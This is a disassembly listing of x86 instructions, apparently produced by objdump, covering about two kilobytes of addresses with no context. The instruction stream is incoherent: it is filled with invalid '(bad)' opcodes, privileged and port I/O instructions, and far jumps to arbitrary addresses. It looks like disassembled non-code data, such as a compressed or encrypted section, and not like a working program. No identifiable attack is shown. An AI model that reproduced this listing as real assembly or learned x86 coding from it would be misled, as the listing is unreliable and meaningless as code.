  41cfea:	or     ah,BYTE PTR [ecx]
  41cfec:	mov    bl,dl
  41cfee:	mov    cl,0x8b
  41cff0:	test   al,0xee
  41cff2:	fild   WORD PTR [edi-0x1e2439cd]
  41cff8:	pop    ds
  41cff9:	call   0x503cee00
  41cffe:	lods   eax,DWORD PTR ds:[esi]
  41cfff:	rcr    DWORD PTR [edx-0x32],1
  41d002:	fadd   QWORD PTR [ebp-0x34]
  41d005:	mov    bh,0x9d
  41d007:	sbb    al,0x7e
  41d009:	shl    al,cl
  41d00b:	xor    eax,0x290c9385
  41d010:	add    dl,BYTE PTR [ebx]
  41d012:	xor    ch,0xb6
  41d015:	mov    eax,edx
  41d017:	jge    0x41d028
  41d019:	mov    eax,edi
  41d01b:	adc    bh,bl
  41d01d:	pusha  
  41d01e:	xor    eax,0x450c1ab1
  41d023:	xchg   ebp,eax
  41d024:	enter  0xcd9e,0x9b
  41d028:	cmp    bl,BYTE PTR [eax+ecx*1-0x66]
  41d02c:	pushf  
  41d02d:	sub    DWORD PTR ds:0xf204094a,esp
  41d033:	rdpmc  
  41d035:	stos   DWORD PTR es:[edi],eax
  41d036:	test   BYTE PTR [ecx-0x1105a4b2],0xa6
  41d03d:	data16 mov ds:0x873eaa3e,al
  41d043:	adc    edi,DWORD PTR [esi]
  41d045:	gs push 0xffffff81
  41d048:	push   esi
  41d049:	push   ebp
  41d04a:	xor    eax,0xdb9b13b7
  41d04f:	jmp    FWORD PTR [edx-0x5e]
  41d052:	adc    BYTE PTR [esi+0x66],bh
  41d055:	or     ch,cl
  41d057:	je     0x41cfda
  41d059:	lods   eax,DWORD PTR ds:[esi]
  41d05a:	and    eax,0x84486101
  41d05f:	add    al,0x8d
  41d061:	(bad)  [edi+ecx*1+0x229e624f]
  41d068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d069:	hlt    
  41d06a:	mov    al,ds:0x2d3dafe5
  41d06f:	das    
  41d070:	cmp    DWORD PTR [eax],edx
  41d072:	push   0x8870955a
  41d077:	or     eax,0xeb7b5b96
  41d07c:	ud1    ebp,DWORD PTR [eax-0x1041e8a7]
  41d083:	mov    ebp,DWORD PTR [ecx]
  41d085:	or     esp,esi
  41d087:	jg     0x41d06e
  41d089:	mul    DWORD PTR [edi]
  41d08b:	outs   dx,DWORD PTR ds:[esi]
  41d08c:	add    esp,ebp
  41d08e:	xchg   esi,eax
  41d08f:	(bad)  
  41d090:	das    
  41d091:	popa   
  41d092:	sbb    esi,edi
  41d094:	pop    esi
  41d095:	push   cs
  41d096:	inc    eax
  41d097:	jo     0x41d07f
  41d099:	test   eax,0x1197b75e
  41d09e:	rol    DWORD PTR [esi+0x25114b12],1
  41d0a4:	scas   al,BYTE PTR es:[edi]
  41d0a5:	retf   0x26cc
  41d0a8:	sbb    eax,0xceaee6f3
  41d0ad:	(bad)  
  41d0af:	dec    esi
  41d0b0:	mov    bl,0x9b
  41d0b2:	das    
  41d0b3:	aam    0x6c
  41d0b5:	sbb    esi,DWORD PTR [edi+0x5e]
  41d0b8:	lahf   
  41d0b9:	retf   0xfec6
  41d0bc:	lds    edi,FWORD PTR [eax+eax*1]
  41d0bf:	call   0x1e64:0x5821ea06
  41d0c6:	mov    edi,DWORD PTR [edi+edx*1+0x69962ca6]
  41d0cd:	stc    
  41d0ce:	pop    edi
  41d0cf:	popf   
  41d0d0:	inc    edi
  41d0d1:	les    ebp,FWORD PTR [edi]
  41d0d3:	out    dx,eax
  41d0d4:	fs push 0xf4f9869b
  41d0da:	and    al,bl
  41d0dc:	aad    0xd0
  41d0de:	jmp    0xaca79da6
  41d0e3:	sbb    al,0x60
  41d0e5:	sub    al,0x31
  41d0e7:	lods   al,BYTE PTR ds:[esi]
  41d0e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0e9:	xor    eax,ecx
  41d0eb:	ja     0x41d0e0
  41d0ed:	cmp    dh,BYTE PTR ds:0xe431eaa1
  41d0f3:	or     esp,DWORD PTR [eax+0x5e]
  41d0f6:	mov    ds:0xf875dbf7,al
  41d0fb:	dec    ebp
  41d0fc:	(bad)  
  41d0fd:	loop   0x41d155
  41d0ff:	popa   
  41d100:	pusha  
  41d101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d102:	ret    0xa56c
  41d105:	add    eax,0x8aaa4390
  41d10a:	xchg   DWORD PTR [ebx-0x7d],eax
  41d10d:	shl    BYTE PTR [edi],cl
  41d10f:	clc    
  41d110:	sub    BYTE PTR [eax],bl
  41d112:	lds    ebx,FWORD PTR [ebp+edx*1+0x4f2888dd]
  41d119:	push   edi
  41d11a:	(bad)  
  41d11c:	and    ebp,DWORD PTR [esi+0x5f836b3b]
  41d122:	xor    edx,0xffffffed
  41d125:	and    al,bl
  41d127:	push   ebx
  41d128:	sub    al,0xdd
  41d12a:	fistp  WORD PTR [ebx]
  41d12c:	fsubr  st,st(0)
  41d12e:	cmp    eax,0x43fa081
  41d133:	jo     0x41d132
  41d135:	sub    esi,DWORD PTR [ecx]
  41d137:	or     dh,BYTE PTR [ebx]
  41d139:	sbb    DWORD PTR [esi-0xd],ebp
  41d13c:	jmp    0x5944:0x78271a5f
  41d143:	repnz cmp edi,esi
  41d146:	jmp    0xe837:0x9953d81a
  41d14d:	mov    ecx,0xf5ed6683
  41d152:	out    0x85,al
  41d154:	dec    esp
  41d155:	scas   eax,DWORD PTR es:[edi]
  41d156:	iret   
  41d157:	hlt    
  41d158:	sub    esp,DWORD PTR [ebp+0x7c19d884]
  41d15e:	cmp    dh,BYTE PTR [ecx]
  41d160:	and    edi,eax
  41d162:	pop    edi
  41d163:	push   ecx
  41d164:	jno    0x41d102
  41d166:	push   ecx
  41d168:	and    al,0x8
  41d16a:	outs   dx,DWORD PTR ds:[esi]
  41d16b:	rcr    DWORD PTR [ecx],1
  41d16d:	dec    ecx
  41d16e:	daa    
  41d16f:	rol    BYTE PTR [edi+ebp*8],0x85
  41d173:	sbb    ah,0xcb
  41d176:	das    
  41d177:	icebp  
  41d178:	ins    DWORD PTR es:[edi],dx
  41d179:	retf   
  41d17a:	or     eax,0x3b7a5b70
  41d17f:	packsswb mm7,mm6
  41d182:	or     DWORD PTR [ebx+0x6c],edi
  41d185:	push   ebx
  41d186:	adc    al,BYTE PTR ds:0xe7d89327
  41d18c:	push   0x5b8cab90
  41d191:	jmp    0x6bd3:0x6f2033a3
  41d198:	add    al,0x14
  41d19a:	data16 mov ah,0xbf
  41d19d:	call   0xebd7db64
  41d1a2:	cdq    
  41d1a3:	jns    0x41d1df
  41d1a5:	shl    DWORD PTR [eax+eax*4],cl
  41d1a8:	dec    eax
  41d1a9:	jns    0x41d218
  41d1ab:	(bad)  
  41d1ac:	push   esi
  41d1ad:	sub    ah,ch
  41d1af:	ficom  WORD PTR [ecx]
  41d1b1:	rcr    BYTE PTR [edi-0x1aa9a04a],cl
  41d1b7:	and    BYTE PTR ss:[eax+0x6fbe104],0xe9
  41d1bf:	inc    eax
  41d1c0:	adc    eax,0x6c5ec0af
  41d1c5:	adc    al,0x33
  41d1c7:	fwait
  41d1c8:	cmp    DWORD PTR [eax+0x6ac622c3],0x13
  41d1cf:	ds test al,0xc5
  41d1d2:	into   
  41d1d3:	shr    DWORD PTR [eax+eiz*4+0x5c],1
  41d1d7:	dec    esp
  41d1d8:	and    edx,ebp
  41d1da:	ror    DWORD PTR [eax+0x6d232cfe],0x11
  41d1e1:	cwde   
  41d1e2:	inc    edi
  41d1e3:	pop    ebx
  41d1e4:	cs (bad) 
  41d1e6:	arpl   WORD PTR [ebx+ecx*8],di
  41d1e9:	(bad)  
  41d1ea:	xor    al,0xb1
  41d1ec:	push   esi
  41d1ed:	jge    0x41d1e5
  41d1ef:	ret    0xb01a
  41d1f2:	dec    edx
  41d1f3:	stos   DWORD PTR es:[edi],eax
  41d1f4:	and    al,BYTE PTR [ebx+0x4]
  41d1f7:	xchg   ebx,eax
  41d1f8:	(bad)  
  41d1fa:	ror    DWORD PTR [ecx+ecx*8],1
  41d1fd:	test   DWORD PTR [esi],ecx
  41d1ff:	push   ss
  41d200:	in     al,dx
  41d201:	lock push eax
  41d203:	lds    esi,FWORD PTR [eax+0x2e]
  41d206:	mov    al,ds:0x368bdb65
  41d20b:	mov    al,ds:0x35c5fda2
  41d210:	push   ebp
  41d211:	scas   al,BYTE PTR es:[edi]
  41d212:	inc    esp
  41d213:	hlt    
  41d214:	push   ecx
  41d215:	sub    eax,0xab59ac4b
  41d21a:	pop    ecx
  41d21b:	fimul  WORD PTR [esi+0x2e64b321]
  41d221:	test   DWORD PTR [edi],ebp
  41d223:	xor    DWORD PTR [edx+0x10],ebx
  41d226:	sub    BYTE PTR [ecx+0x2f],ch
  41d229:	rol    BYTE PTR [ebx+0x2245a094],cl
  41d22f:	mul    BYTE PTR [ecx+ecx*2-0x118a2b83]
  41d236:	jg     0x41d212
  41d238:	mov    ebx,0xd5ed62a3
  41d23d:	xchg   ecx,eax
  41d23e:	fadd   QWORD PTR [edx+0x1c8672d1]
  41d244:	mov    esi,fs
  41d246:	fwait
  41d247:	jb     0x41d29b
  41d249:	mov    ebp,0xa9e3070d
  41d24e:	(bad)  
  41d24f:	pop    ecx
  41d250:	or     eax,0x13688d14
  41d255:	cmc    
  41d256:	popa   
  41d257:	js     0x41d2b4
  41d259:	push   es
  41d25a:	ins    DWORD PTR es:[edi],dx
  41d25b:	inc    esp
  41d25c:	loop   0x41d203
  41d25e:	push   eax
  41d25f:	jge    0x41d2d5
  41d261:	jge    0x41d218
  41d263:	pop    ss
  41d264:	sub    al,BYTE PTR [edx+0x1ef36faf]
  41d26a:	push   ecx
  41d26b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d26c:	pop    esp
  41d26d:	mov    al,0xda
  41d26f:	sub    bl,BYTE PTR [edi-0x8]
  41d272:	(bad)  
  41d273:	(bad)  
  41d274:	mov    DWORD PTR [esi+0x43],eax
  41d277:	jns    0x41d2e6
  41d279:	pop    es
  41d27a:	pop    ebp
  41d27b:	repz pop ss
  41d27d:	sub    DWORD PTR [ebx+eax*4-0x580d2e05],esi
  41d284:	inc    esi
  41d285:	daa    
  41d286:	pop    ecx
  41d287:	je     0x41d283
  41d289:	retf   
  41d28a:	jo     0x41d2ac
  41d28c:	mov    al,0x9f
  41d28e:	mov    esp,0x14f10644
  41d293:	or     al,0xba
  41d295:	xor    DWORD PTR [esi-0x561c3a61],eax
  41d29b:	jg     0x41d21f
  41d29d:	rcr    BYTE PTR [ecx],0x46
  41d2a0:	(bad)
  41d2a4:	cmp    DWORD PTR [ebx],edi
  41d2a6:	retf   
  41d2a7:	clc    
  41d2a8:	and    esp,DWORD PTR [eax-0x601e35d0]
  41d2ae:	sbb    al,0xa4
  41d2b0:	(bad)  
  41d2b2:	repz push edx
  41d2b4:	out    0xcb,al
  41d2b6:	cdq    
  41d2b7:	mov    esi,0x68f1bb4
  41d2bc:	shl    BYTE PTR [edx],0xd2
  41d2bf:	xor    DWORD PTR [edi+0x54338e11],esi
  41d2c5:	dec    ecx
  41d2c6:	add    edi,ecx
  41d2c8:	(bad)  
  41d2c9:	outs   dx,DWORD PTR ds:[esi]
  41d2ca:	xchg   edi,eax
  41d2cb:	mov    edx,0x97d97a72
  41d2d0:	sub    ebx,DWORD PTR [ecx+0x78]
  41d2d3:	fwait
  41d2d4:	jmp    0xac947c72
  41d2d9:	push   ds
  41d2da:	adc    DWORD PTR ss:[ebp+0xb],edx
  41d2de:	(bad)  
  41d2df:	pop    es
  41d2e0:	inc    esp
  41d2e1:	out    dx,eax
  41d2e2:	leave  
  41d2e3:	mov    ds:0x6730d151,eax
  41d2e8:	xchg   BYTE PTR [edx+ecx*4-0x3d],bl
  41d2ec:	xor    BYTE PTR [edi+0x25],dh
  41d2ef:	push   esp
  41d2f0:	cmp    BYTE PTR [edi-0x3b],al
  41d2f3:	lods   eax,DWORD PTR ds:[esi]
  41d2f4:	sub    dl,al
  41d2f6:	push   cs
  41d2f7:	(bad)  
  41d2f8:	mov    edx,0x3b312ee1
  41d2fd:	sbb    cl,ah
  41d2ff:	stos   BYTE PTR es:[edi],al
  41d300:	call   0xbc6bc896
  41d305:	shl    BYTE PTR [ebp-0x32177c46],1
  41d30b:	sub    BYTE PTR [esp+esi*8+0x5],0x5f
  41d310:	in     al,dx
  41d311:	fs je  0x41d33c
  41d314:	xchg   BYTE PTR [edi],ah
  41d316:	lds    ecx,FWORD PTR [ecx+0xb4c298c]
  41d31c:	sbb    dh,bl
  41d31e:	adc    dh,dh
  41d320:	add    eax,0xcc60072d
  41d325:	std    
  41d326:	sbb    DWORD PTR [edi+ecx*2+0x6b],ecx
  41d32a:	lds    ecx,FWORD PTR [eax]
  41d32c:	sub    bl,BYTE PTR [edi]
  41d32e:	mov    ch,cl
  41d330:	mov    al,0x27
  41d332:	mov    al,0x15
  41d334:	outs   dx,WORD PTR ds:[esi]
  41d336:	xchg   ebx,eax
  41d337:	dec    ebp
  41d338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d339:	pop    ecx
  41d33a:	sbb    DWORD PTR ss:[ebx],ecx
  41d33d:	or     ch,BYTE PTR [ebx+0x76]
  41d340:	jecxz  0x41d31a
  41d342:	test   al,0x99
  41d344:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d345:	jnp    0x41d2c9
  41d347:	xchg   ecx,eax
  41d348:	inc    edx
  41d349:	leave  
  41d34a:	ret    0x5fe5
  41d34d:	sub    DWORD PTR [ebx+0x232b89b9],eax
  41d353:	inc    ecx
  41d354:	push   0x5d4a7960
  41d359:	xor    al,0x8
  41d35b:	gs dec edx
  41d35d:	inc    ecx
  41d35e:	js     0x41d307
  41d360:	sub    DWORD PTR [ecx],0x486e443
  41d366:	aas    
  41d367:	loopne 0x41d2f9
  41d369:	inc    ebx
  41d36a:	dec    esi
  41d36b:	test   BYTE PTR [eax],0x6b
  41d36e:	rol    DWORD PTR ds:0xad3c0168,cl
  41d374:	fisttp WORD PTR [esi]
  41d376:	mov    ebx,0x1d07407a
  41d37b:	add    al,0x11
  41d37d:	pusha  
  41d37e:	cmp    BYTE PTR [eax-0x4068b557],al
  41d384:	mov    ch,0xb6
  41d386:	pop    ebx
  41d387:	adc    esp,DWORD PTR [esi-0x11013dd2]
  41d38d:	pop    edi
  41d38e:	inc    ebx
  41d38f:	enter  0x758,0x50
  41d393:	xor    ch,BYTE PTR [eax+0x3c84069a]
  41d399:	fs loop 0x41d3ae
  41d39c:	push   0x2
  41d39e:	push   ss
  41d39f:	pop    ss
  41d3a0:	call   0xcdc6:0x30f42465
  41d3a7:	cmp    dh,BYTE PTR [esi+0x4ec2e212]
  41d3ad:	test   eax,0x6e0fccb6
  41d3b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3b3:	sub    edi,DWORD PTR [ecx]
  41d3b5:	push   edx
  41d3b6:	out    0x36,eax
  41d3b8:	xchg   esi,eax
  41d3b9:	lahf   
  41d3ba:	add    eax,DWORD PTR [eax]
  41d3bc:	pop    esi
  41d3bd:	inc    ebx
  41d3be:	ja     0x41d402
  41d3c0:	pop    ecx
  41d3c1:	inc    ebx
  41d3c2:	mov    al,0x91
  41d3c4:	xchg   ecx,eax
  41d3c5:	inc    edi
  41d3c6:	pop    ebp
  41d3c7:	cmove  edi,DWORD PTR [edx+0x1a]
  41d3cb:	mov    ecx,0x9a7791e8
  41d3d0:	xor    ah,BYTE PTR [esi-0x7e773380]
  41d3d6:	retf   
  41d3d7:	inc    esi
  41d3d8:	pop    ss
  41d3d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3da:	loop   0x41d450
  41d3dc:	push   0xffffffd8
  41d3de:	int    0x98
  41d3e0:	add    BYTE PTR [ebx+0x3d],dl
  41d3e3:	div    DWORD PTR [ecx+0x41]
  41d3e6:	or     bh,BYTE PTR [edx+0x7600f8d5]
  41d3ec:	or     BYTE PTR [ecx-0x72],bl
  41d3ef:	mov    edx,0xb1370d15
  41d3f4:	cmp    bh,dh
  41d3f6:	stos   BYTE PTR es:[edi],al
  41d3f7:	(bad)  
  41d3f8:	mov    ds:0xe85e61e5,eax
  41d3fd:	xor    BYTE PTR [ebp+eiz*2-0x20],bh
  41d401:	mov    esp,0xa082035c
  41d406:	jmp    0x41d3ba
  41d408:	test   DWORD PTR [eax-0x721ffb4d],esp
  41d40e:	xchg   BYTE PTR [ebx+eax*8+0x48],dh
  41d412:	imul   ebp,edi,0xb9614250
  41d418:	push   ebp
  41d419:	add    al,0x39
  41d41b:	fcmovbe st,st(3)
  41d41d:	jle    0x41d492
  41d41f:	cmp    eax,0xbf826a4e
  41d424:	shr    BYTE PTR [ecx],cl
  41d426:	cmc    
  41d427:	and    eax,0xf238003
  41d42c:	sub    BYTE PTR [ecx+edx*4-0x38014274],cl
  41d433:	imul   ecx,DWORD PTR ds:0x2901ebe4,0x8f84a47f
  41d43d:	jmp    0xaf273727
  41d442:	sahf   
  41d443:	jae    0x41d49e
  41d445:	add    ch,BYTE PTR [edx-0x5632977a]
  41d44b:	xchg   DWORD PTR [edi-0x4b8a3f08],esp
  41d451:	stc    
  41d452:	lea    edi,[edx]
  41d454:	imul   edi,DWORD PTR ds:0x71db4e4d,0xfffffffb
  41d45b:	pop    esp
  41d45c:	xlat   BYTE PTR ds:[ebx]
  41d45d:	sahf   
  41d45e:	and    DWORD PTR [esp+ebp*2+0x5b],ebp
  41d462:	int3   
  41d463:	fistp  DWORD PTR [esi+0xb]
  41d466:	adc    bh,ah
  41d468:	test   ch,dh
  41d46a:	(bad)  
  41d46c:	mov    eax,ds:0xa8c1f5ed
  41d471:	cmp    ecx,esp
  41d473:	in     eax,0xc9
  41d475:	and    eax,0x2e25d85e
  41d47a:	sbb    al,0xcd
  41d47c:	nop
  41d47d:	jno    0x41d425
  41d47f:	call   0x55fc:0xbf32bf07
  41d486:	mov    BYTE PTR [esi-0x7863401b],ch
  41d48c:	jl     0x41d43e
  41d48e:	mov    DWORD PTR ds:[edi],ebp
  41d491:	enter  0x2450,0xd1
  41d495:	in     eax,0x86
  41d497:	lahf   
  41d498:	(bad)  
  41d499:	mov    edx,0x171bd0e2
  41d49e:	paddusb mm5,QWORD PTR [edx]
  41d4a1:	cmp    edi,DWORD PTR [ebp-0x3c]
  41d4a4:	leave  
  41d4a5:	sbb    ch,BYTE PTR [edx]
  41d4a7:	imul   ecx,ebp,0xffffffaa
  41d4aa:	mov    ecx,0xdaadb4e8
  41d4af:	loop   0x41d4b8
  41d4b1:	sub    BYTE PTR [ebx-0x1f],dh
  41d4b4:	sub    ch,BYTE PTR [ebx]
  41d4b6:	add    edi,DWORD PTR [ebx+0x36]
  41d4b9:	adc    DWORD PTR [esi+0x7f0cc605],ebx
  41d4bf:	sub    DWORD PTR [edi-0x53],ecx
  41d4c2:	popf   
  41d4c3:	(bad)  
  41d4c4:	stos   DWORD PTR es:[edi],eax
  41d4c5:	sbb    al,0x63
  41d4c7:	cmp    eax,DWORD PTR [ecx]
  41d4c9:	push   ebx
  41d4ca:	(bad)  
  41d4cb:	das    
  41d4cc:	cdq    
  41d4cd:	mov    DWORD PTR [esi-0x32],esi
  41d4d0:	mov    WORD PTR [eax-0x46],es
  41d4d3:	pop    ebx
  41d4d4:	sbb    eax,0xd1740c93
  41d4d9:	jp     0x41d498
  41d4db:	push   ebp
  41d4dc:	mov    edi,DWORD PTR [eax+0x426363f7]
  41d4e2:	mov    BYTE PTR [esi+0xb],al
  41d4e5:	add    eax,DWORD PTR [eax-0x36]
  41d4e8:	cwde   
  41d4e9:	loop   0x41d480
  41d4eb:	inc    ebp
  41d4ec:	repnz mov esi,fs
  41d4ef:	inc    edi
  41d4f0:	sbb    BYTE PTR [ecx],ah
  41d4f2:	jno    0x41d506
  41d4f4:	call   0x8403:0xbf2ff34
  41d4fb:	mov    dh,BYTE PTR [edx]
  41d4fd:	inc    ebp
  41d4fe:	sub    BYTE PTR [esi-0x768efdd4],cl
  41d504:	in     al,dx
  41d505:	(bad)  
  41d507:	mov    bp,di
  41d50a:	cmp    cl,BYTE PTR [edx-0x1f]
  41d50d:	outs   dx,DWORD PTR ds:[esi]
  41d50e:	and    ch,BYTE PTR [eax+ebx*2-0x78]
  41d512:	mov    ebx,0xc44da31a
  41d517:	sbb    al,0xe3
  41d519:	cmp    al,0xc
  41d51b:	cmp    eax,0x74c5dfa5
  41d520:	add    eax,0x30ffa84
  41d525:	mov    bh,0x0
  41d527:	sub    eax,0x43393fae
  41d52c:	shl    BYTE PTR cs:[edi],cl
  41d52f:	or     al,BYTE PTR [ecx+0x2e]
  41d532:	mov    dl,0xcf
  41d534:	mov    esi,0x9725544d
  41d539:	sub    BYTE PTR [ecx-0x53d2a71d],bl
  41d53f:	xchg   esi,eax
  41d540:	inc    edi
  41d541:	sbb    ebx,DWORD PTR [ebx+0x7d]
  41d544:	scas   al,BYTE PTR es:[edi]
  41d545:	(bad)  
  41d546:	ss jp  0x41d57a
  41d549:	retf   
  41d54a:	and    BYTE PTR [ebx-0x420a3201],bh
  41d550:	jno    0x41d53d
  41d552:	rol    BYTE PTR [ebx+0x5d1a319a],1
  41d558:	pushaw 
  41d55a:	test   BYTE PTR [edx-0x62d91be9],ah
  41d560:	dec    edi
  41d561:	jnp    0x41d585
  41d563:	shl    DWORD PTR [edx-0x7],1
  41d566:	div    BYTE PTR [ebx+esi*2+0x17]
  41d56a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d56b:	jmp    0x874a:0x67fc1ea0
  41d572:	clc    
  41d573:	sti    
  41d574:	xor    BYTE PTR [ecx-0x39b5c5da],bh
  41d57a:	repnz hlt 
  41d57c:	sbb    edi,DWORD PTR [esi+0x60]
  41d57f:	sub    eax,0xf648d0cf
  41d584:	imul   edx,esp,0xb13069ba
  41d58a:	loop   0x41d51e
  41d58c:	and    al,0x6f
  41d58e:	push   esp
  41d58f:	add    eax,0x7a2879f5
  41d594:	and    BYTE PTR [ecx+0xd],dh
  41d597:	(bad)  [eax-0x16]
  41d59a:	jb     0x41d5f3
  41d59c:	cmp    DWORD PTR [ecx+ecx*4],ebx
  41d59f:	pop    esi
  41d5a0:	out    dx,al
  41d5a1:	lds    esi,FWORD PTR [ebx]
  41d5a3:	dec    ebp
  41d5a4:	jnp    0x41d526
  41d5a6:	xor    ah,bl
  41d5a8:	sbb    DWORD PTR [edx-0x32eb47a7],0x458c072
  41d5b2:	cld    
  41d5b3:	mov    DWORD PTR [ecx+esi*2-0x4a5523f6],ecx
  41d5ba:	rcl    DWORD PTR [esi+0x7b5e8e01],0x8c
  41d5c1:	jo     0x41d59d
  41d5c3:	aam    0x1d
  41d5c5:	mov    eax,ds:0xd11b2c9d
  41d5ca:	repz bound ecx,QWORD PTR [edi+0xd]
  41d5ce:	in     eax,0x9f
  41d5d0:	adc    eax,0xabb9c18c
  41d5d5:	test   eax,0xa0bed5e6
  41d5da:	imul   edx,DWORD PTR [esi+ebx*2-0x5],0xeb637979
  41d5e2:	jns    0x41d5a2
  41d5e4:	jg     0x41d661
  41d5e6:	dec    ecx
  41d5e7:	cmp    eax,0xb032b459
  41d5ec:	push   es
  41d5ed:	enter  0xc1fd,0x94
  41d5f1:	sbb    esp,DWORD PTR [ecx]
  41d5f3:	adc    cl,BYTE PTR [eax]
  41d5f5:	or     BYTE PTR [ecx+0x0],al
  41d5f8:	mov    ah,0x23
  41d5fa:	(bad)  
  41d5fb:	mov    ah,0x26
  41d5fd:	mov    edi,0x185eb6a5
  41d602:	arpl   WORD PTR [edx],bp
  41d604:	int    0xb0
  41d606:	inc    esi
  41d607:	mov    al,ds:0x7c13e909
  41d60c:	into   
  41d60d:	dec    ecx
  41d60e:	das    
  41d60f:	jge    0x41d5fa
  41d611:	mov    edi,0xc7671bfd
  41d616:	xchg   bh,ah
  41d618:	sub    eax,0xf9a4b3dc
  41d61d:	pop    ebp
  41d61e:	pop    esp
  41d61f:	cli    
  41d620:	sbb    eax,0xde9952f1
  41d625:	or     al,0x47
  41d627:	hlt    
  41d628:	xor    esp,ebx
  41d62a:	in     eax,dx
  41d62b:	lock stos BYTE PTR es:[edi],al
  41d62d:	cmp    al,0xa8
  41d62f:	scas   al,BYTE PTR es:[edi]
  41d630:	push   ecx
  41d631:	pop    esi
  41d632:	mov    dl,0xdd
  41d634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d635:	and    DWORD PTR [ebp+0x456d2954],esp
  41d63b:	stc    
  41d63c:	sahf   
  41d63d:	jb     0x41d5f4
  41d63f:	scas   al,BYTE PTR es:[edi]
  41d640:	mov    esi,0xdcd6f895
  41d645:	xor    eax,ecx
  41d647:	je     0x41d5cd
  41d649:	fs addr16 popa 
  41d64c:	jecxz  0x41d662
  41d64e:	div    BYTE PTR [esi]
  41d650:	jbe    0x41d679
  41d652:	push   edx
  41d653:	inc    esi
  41d654:	sbb    eax,0xe75c10f6
  41d659:	mov    edi,esi
  41d65b:	xor    eax,0xef3803a0
  41d660:	push   ebp
  41d661:	(bad)  
  41d662:	sbb    al,0xf
  41d664:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d665:	ds cs lahf 
  41d668:	jne    0x41d6ab
  41d66a:	cmp    eax,DWORD PTR [edi]
  41d66c:	cmp    eax,0x5f5c3455
  41d671:	fistp  WORD PTR [edx]
  41d673:	ret    
  41d674:	jg     0x41d685
  41d676:	or     al,0x8e
  41d678:	sbb    eax,0xe45a8b30
  41d67d:	sub    ebx,DWORD PTR [eax]
  41d67f:	icebp  
  41d680:	call   0x91719f82
  41d685:	jmp    0xac03bcad
  41d68a:	inc    edx
  41d68b:	fucom  st(3)
  41d68d:	sbb    eax,0x4b66a4b6
  41d692:	dec    eax
  41d693:	lds    ebx,FWORD PTR [eax-0x7]
  41d696:	mov    esp,0x9480cd0a
  41d69b:	push   ds
  41d69c:	cmp    eax,0xefc1f5e0
  41d6a1:	jns    0x41d6de
  41d6a3:	mov    ah,0x43
  41d6a5:	xor    al,0x7
  41d6a7:	shr    ebp,1
  41d6a9:	inc    edx
  41d6aa:	mov    BYTE PTR [ebx-0x7b],dl
  41d6ad:	xor    edi,0x79f38e8d
  41d6b3:	call   0xdceaeea6
  41d6b8:	in     eax,dx
  41d6b9:	aas    
  41d6ba:	js     0x41d63f
  41d6bc:	push   esp
  41d6bd:	fst    DWORD PTR [ebx-0x52ad8821]
  41d6c3:	mov    dh,0xc
  41d6c5:	mov    ds:0x170e04c7,eax
  41d6ca:	and    ebp,eax
  41d6cc:	pop    es
  41d6cd:	adc    eax,0xef24d63f
  41d6d2:	in     al,0xcf
  41d6d4:	mov    al,ds:0xcb5728de
  41d6d9:	cmc    
  41d6da:	test   eax,0x96a347cd
  41d6df:	fidiv  WORD PTR [edi+0x5533fd6e]
  41d6e5:	pop    ds
  41d6e6:	cmp    ch,BYTE PTR [esi-0x49067ae4]
  41d6ec:	pop    ecx
  41d6ed:	push   ebp
  41d6ee:	enter  0x6cb,0x61
  41d6f2:	lods   al,BYTE PTR ds:[esi]
  41d6f3:	push   0x6d
  41d6f5:	mov    eax,0xe3f90236
  41d6fa:	push   cs
  41d6fb:	cs in  eax,dx
  41d6fd:	xor    BYTE PTR [edx-0x18],al
  41d700:	jp     0x41d6e2
  41d702:	push   ebx
  41d703:	lods   al,BYTE PTR ds:[esi]
  41d704:	inc    esi
  41d705:	ret    
  41d706:	push   esi
  41d707:	or     DWORD PTR [ebp+0x79c86f42],ebp
  41d70d:	out    dx,eax
  41d70e:	jo     0x41d70e
  41d710:	sub    DWORD PTR [esi+0x7308f217],esp
  41d716:	lahf   
  41d717:	scas   eax,DWORD PTR es:[edi]
  41d718:	fwait
  41d719:	adc    eax,0xbd74daa9
  41d71e:	push   ds
  41d71f:	mov    cl,0x7
  41d721:	mov    es,WORD PTR [esi+esi*1-0x71]
  41d725:	add    BYTE PTR [esi+0x25],bl
  41d728:	retf   0xcd5c
  41d72b:	shl    dh,cl
  41d72d:	call   0x8fb2c2e9
  41d732:	aad    0x58
  41d734:	pop    ss
  41d735:	fidivr WORD PTR [ebp-0x4d36c3fb]
  41d73b:	inc    edx
  41d73c:	scas   eax,DWORD PTR es:[edi]
  41d73d:	mov    ecx,0xc6880d46
  41d742:	clc    
  41d743:	loope  0x41d6ee
  41d745:	ficomp DWORD PTR [ebx+0x64]
  41d748:	and    edx,DWORD PTR [ebp-0x444157a5]
  41d74e:	sbb    DWORD PTR [ecx+0x4a],ecx
  41d751:	sbb    al,0xa2
  41d753:	out    0x78,eax
  41d755:	popf   
  41d756:	sub    BYTE PTR [eax-0x78c1cc28],bl
  41d75c:	and    al,0x43
  41d75e:	mov    ebp,DWORD PTR [esi]
  41d760:	mov    cl,BYTE PTR [esi+0x4d7e8b23]
  41d766:	out    dx,eax
  41d767:	fsubr  DWORD PTR [bx+si+0x1721]
  41d76c:	mov    ebp,eax
  41d76e:	iret   
  41d76f:	js     0x41d76a
  41d771:	cld    
  41d772:	lahf   
  41d773:	icebp  
  41d774:	inc    esp
  41d775:	jl     0x41d75e
  41d777:	cs clc 
  41d779:	pop    esp
  41d77a:	in     al,dx
  41d77b:	and    al,0x1c
  41d77d:	sbb    DWORD PTR [eax-0x41],0xffffff88
  41d781:	pop    edi
  41d782:	cmp    DWORD PTR ds:0x414fa24f,edx
  41d788:	add    BYTE PTR [edi],dl
  41d78a:	mov    fs,WORD PTR [eax]
  41d78c:	imul   edi,esp,0x4b
  41d78f:	into   
  41d790:	fs (bad) 
  41d792:	adc    al,0x49
  41d794:	sbb    DWORD PTR [edx+0x2f00c5ae],0xffffffa4
  41d79b:	or     al,0x8d
